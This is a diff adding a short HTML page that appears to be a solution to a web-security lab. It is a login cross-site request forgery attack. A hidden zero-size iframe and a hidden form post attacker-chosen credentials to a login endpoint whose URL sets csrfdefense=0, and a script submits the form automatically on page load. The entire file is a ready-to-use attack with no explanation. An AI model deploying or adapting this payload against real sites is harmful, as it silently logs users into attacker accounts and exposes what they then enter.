@@ -1,0 +1,9 @@
+<iframe name='haha' style="border:none" width=0 height= 0 > </iframe>
+<form id='test' method='post' action='http://permalink.co:8080/login?csrfdefense=0&xssdefense=5' target='haha' hidden>
+	<input name='username' value='attacker'/>
+	<input name='password' value='l33th4x'/>
+</form>
+
+<script>
+	document.getElementById('test').submit()
+</script>
